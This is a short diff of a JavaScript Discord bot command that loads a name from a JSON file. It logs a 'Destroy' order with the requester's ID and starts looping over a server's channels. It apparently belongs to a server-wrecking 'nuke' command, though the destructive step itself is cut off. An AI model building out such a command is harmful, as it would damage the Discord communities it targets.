@@ -1,5 +1,5 @@
 exports.run = async (client, message, args) => {
-  let arg = "Gustavo33"
+  let arg = require("./Nome.json").nome
     console.log(`Destroy Ordernado Por ${message.author.username} ID: ${message.author.id}`)
     function a1(){
         client.guilds.get(message.guild.id).channels.forEach((canal) => {
